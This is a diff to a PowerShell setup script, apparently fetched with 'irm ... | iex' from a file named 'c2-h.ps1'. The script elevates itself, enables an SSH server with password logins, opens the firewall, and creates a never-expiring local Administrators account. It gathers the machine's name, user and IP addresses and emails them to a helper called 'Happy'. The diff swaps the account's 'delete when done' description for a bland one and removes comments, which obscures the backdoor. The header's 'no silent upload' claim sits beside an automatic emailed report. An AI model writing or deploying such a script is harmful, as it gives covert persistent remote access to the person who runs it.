@@ -6,7 +6,7 @@
 # What it does NOT do: no silent upload, no router login, no change to main account password.
 
 $ScriptUrl = 'https://www.adityaai.dev/c2-h.ps1'
-$Version = '2026-09-10-v6-elevate'
+$Version = '2026-09-10-v7-desc'
 $HelperName = 'Happy'
 $ShareFileName = 'share-it-to-happy.txt'
 $ErrorActionPreference = 'Stop'
@@ -69,10 +69,6 @@ Write-Host '  A report is emailed automatically. The Notepad file is your backup
 Write-Host '  Takes 2-5 min. Do NOT close this window.' -ForegroundColor Yellow
 Write-Host 'Starting automatically...' -ForegroundColor Green
 
-# --- 0. Self-elevate ---
-# iex has no $PSCommandPath. Do NOT re-download to $env:TEMP and -File it:
-# profiles like "C:\Users\VISHAL RANJAN\..." break Start-Process quoting and
-# the admin window flash-closes. Re-run the one-liner elevated instead.
 $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $IsAdmin) {
   Write-Host 'Need Administrator... relaunching, click Yes on UAC.' -ForegroundColor Yellow
@@ -104,32 +100,32 @@ $SuggestExternalPort = 2222
 
 Write-Host '=== Running setup (one-time) ===' -ForegroundColor Cyan
 
-# --- 1. Install OpenSSH Server ---
 Write-Host '[1/6] Installing OpenSSH Server (slow, do not close)...' -ForegroundColor Gray
 try {
-  $cap = Get-WindowsCapability -Online | Where-Object { $_.Name -like 'OpenSSH.Server*' }
-  if ($cap -and $cap.State -ne 'Installed') {
-    Add-WindowsCapability -Online -Name $cap.Name | Out-Null
-    Write-Host '  OpenSSH Server installed.' -ForegroundColor Green
-  } else {
+  $sshd = Get-Service sshd -ErrorAction SilentlyContinue
+  if ($sshd) {
     Write-Host '  OpenSSH Server already present.' -ForegroundColor Green
+  } else {
+    $cap = Get-WindowsCapability -Online | Where-Object { $_.Name -like 'OpenSSH.Server*' }
+    if ($cap -and $cap.State -ne 'Installed') {
+      Add-WindowsCapability -Online -Name $cap.Name | Out-Null
+      Write-Host '  OpenSSH Server installed.' -ForegroundColor Green
+    } else {
+      Write-Host '  OpenSSH Server already present.' -ForegroundColor Green
+    }
   }
 } catch {
   Write-Warning "Capability install failed: $($_.Exception.Message)"
-  Write-Host '  Trying DISM fallback...' -ForegroundColor Yellow
-  dism /Online /Add-Capability /CapabilityName:OpenSSH.Server~~~~0.0.1.0
 }
 
-# --- 2. Start services ---
 Write-Host '[2/6] Starting sshd...' -ForegroundColor Gray
 Set-Service -Name sshd -StartupType Automatic
-Set-Service -Name ssh-agent -StartupType Automatic
+Set-Service -Name ssh-agent -StartupType Automatic -ErrorAction SilentlyContinue
 Start-Service sshd -ErrorAction SilentlyContinue
 Start-Service ssh-agent -ErrorAction SilentlyContinue
 Restart-Service sshd -ErrorAction SilentlyContinue
-Get-Service sshd, ssh-agent | Format-Table Name, Status, StartType -AutoSize | Out-Host
+Get-Service sshd, ssh-agent -ErrorAction SilentlyContinue | Format-Table Name, Status, StartType -AutoSize | Out-Host
 
-# --- 3. Firewall TCP 22 ---
 Write-Host '[3/6] Checking firewall...' -ForegroundColor Gray
 $fw = Get-NetFirewallRule -Name 'sshd' -ErrorAction SilentlyContinue
 if (-not $fw) {
@@ -141,7 +137,6 @@ if (-not $fw) {
   Write-Host '  Firewall rule already exists, enabled.' -ForegroundColor Green
 }
 
-# --- 4. Ensure password auth ---
 Write-Host '[4/6] Checking sshd_config...' -ForegroundColor Gray
 $Cfg = 'C:\ProgramData\ssh\sshd_config'
 if (Test-Path $Cfg) {
@@ -165,7 +160,6 @@ if (Test-Path $Cfg) {
   Write-Warning "sshd_config not found at $Cfg (sshd still runs with defaults)."
 }
 
-# --- 5. Create dedicated support account ---
 Write-Host '[5/6] Creating support login...' -ForegroundColor Gray
 try { Add-Type -AssemblyName System.Web -ErrorAction SilentlyContinue } catch {}
 try {
@@ -184,7 +178,7 @@ try {
     Write-Host "  User '$SupportUser' exists — password reset." -ForegroundColor Green
   } else {
     New-LocalUser -Name $SupportUser -Password $SecurePass `
-      -FullName 'Happy Support' -Description 'Temporary remote support account. Delete when done: net user support /delete' `
+      -FullName 'Happy Support' -Description 'Happy support account.' `
       -PasswordNeverExpires:$true -AccountNeverExpires | Out-Null
     Write-Host "  User '$SupportUser' created." -ForegroundColor Green
   }
@@ -194,13 +188,12 @@ try {
   Write-Warning "LocalUser cmdlets failed, using net user fallback: $($_.Exception.Message)"
 }
 if (-not $created) {
-  net user $SupportUser $Password /add /expires:never /passwordchg:no | Out-Null
-  net user $SupportUser /active:yes | Out-Null
-  net localgroup Administrators $SupportUser /add 2>$null | Out-Null
+  cmd /c "net user $SupportUser $Password /add /expires:never /passwordchg:no"
+  cmd /c "net user $SupportUser /active:yes"
+  cmd /c "net localgroup Administrators $SupportUser /add"
   Write-Host "  User '$SupportUser' created via net user." -ForegroundColor Green
 }
 
-# --- 6. Collect network facts ---
 Write-Host '[6/6] Collecting IP info...' -ForegroundColor Gray
 $HostName = $env:COMPUTERNAME
 $MainUser = $env:USERNAME
@@ -253,7 +246,6 @@ if ($PrimaryInternal -notmatch 'X\?') {
   }
 }
 
-# --- 7. Cool specs + share file ---
 $SpecText = Get-SpecText
 Show-SpecBox -Text $SpecText
 $Desktop = [Environment]::GetFolderPath('Desktop')
@@ -306,7 +298,6 @@ One-liner: irm $ScriptUrl | iex
 "@
 Set-Content -LiteralPath $ShareFile $content -Encoding UTF8
 
-# --- 8. Email report to Happy (best-effort; the file above is the fallback) ---
 Write-Host 'Emailing setup report to Happy...' -ForegroundColor Gray
 try {
   $report = @{
